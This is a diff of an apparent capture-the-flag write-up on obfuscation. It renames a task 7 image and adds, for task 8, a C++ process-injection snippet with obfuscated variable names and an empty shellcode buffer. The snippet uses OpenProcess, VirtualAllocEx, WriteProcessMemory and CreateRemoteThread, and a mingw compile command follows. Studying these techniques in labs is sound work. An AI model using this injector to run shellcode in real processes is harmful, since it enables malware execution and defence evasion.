@@ -436,7 +436,7 @@ while (x > 1):
 
 * What flag is found after properly reversing the provided snippet?
 
-    ![task-flag](./images/task-flag.png)
+    ![task7-flag](./images/task7-flag.png)
 
     **Answer : THM{D3cod3d!!!}**
 
@@ -675,7 +675,32 @@ int main(int argc, char* argv[])
 
     ![task8-code](./images/task8-code.png)
 
+    ```
+    #include "windows.h"
+
+    int main(int argc, char* argv[])
+    {
+        unsigned char shellcode[] = "";
+
+        HANDLE burhs;
+        HANDLE kdhfl;
+        PVOID grmks;
+        
+        burhs = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+        grmks = VirtualAllocEx(burhs, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(burhs, grmks, shellcode, sizeof shellcode, NULL);
+        kdhfl = CreateRemoteThread(burhs, NULL, 0, (LPTHREAD_START_ROUTINE)grmks, NULL, 0, NULL);
+        CloseHandle(burhs);
+        
+        return 0;
+    } 
+    ```
+
     ![task8-compile](./images/task8-compile.png)
+
+    ```
+    x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
+    ```
 
     ![task8-flag](./images/task8-flag.png)
 
